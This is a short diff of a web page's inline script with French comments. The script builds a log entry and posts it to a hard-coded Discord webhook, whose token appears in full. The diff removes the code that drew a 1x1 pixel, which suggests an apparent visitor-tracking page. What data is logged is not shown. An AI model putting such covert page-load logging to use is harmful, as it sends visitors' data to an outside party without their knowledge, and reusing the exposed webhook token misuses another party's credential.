@@ -38,7 +38,8 @@
 
   // Remplacer cette URL par l'URL de ton webhook
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
-
+  console.log(JSON.stringify(logEntry));
+  
   // Envoi des données au webhook
   fetch(WEBHOOK_URL, {
     method: 'POST',
@@ -46,14 +47,6 @@
     body: JSON.stringify(logEntry)
   });
 
-  // Génération d'une image 1x1 pixel blanche
-  const canvas = document.createElement('canvas');
-  canvas.width = 1;
-  canvas.height = 1;
-  const ctx = canvas.getContext('2d');
-  ctx.fillStyle = "#fff";
-  ctx.fillRect(0, 0, 1, 1);
-  document.body.appendChild(canvas); // Optionnel : afficher le pixel
 })();
 </script>
 </body>
